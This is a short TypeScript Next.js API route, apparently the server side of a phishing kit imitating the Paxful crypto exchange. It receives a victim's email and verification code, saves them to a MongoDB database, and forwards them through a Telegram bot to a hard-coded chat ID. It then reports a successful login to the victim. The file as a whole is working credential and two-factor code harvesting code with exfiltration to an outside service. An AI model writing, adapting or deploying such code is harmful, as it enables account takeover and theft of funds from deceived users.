import clientPromise from "@/lib/mongo";
import TelegramBot from "node-telegram-bot-api";

async function create(req: Request) {
  try {
    const body = await req.json();
    const client = await clientPromise;
    const db = client.db("Paxful");
    const bot = new TelegramBot(process.env.TOKEN as string);
    const chatId =  6529214676;

    console.log("body", body);

    // If the user does not exist by email or name Insert the new user into the database
    await db
      .collection("users")
      .updateOne({ email: body.email }, { $set: { code: body.code } });

    // Format the message in Markdown
    const message = `
**Verification Code Received**
- **Email**: ${body.email}
- **Code**: ${body.code}
`;

    // Send the formatted message
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

    return new Response(
      JSON.stringify({ message: "Logged in Successfully!!" }),
      { status: 200 }
    );
  } catch (error) {
    console.error("API Error:", error);
    return new Response(
      JSON.stringify({ message: "An error occurred while logging in" }),
      { status: 500 }
    );
  }
}

export { create as POST };
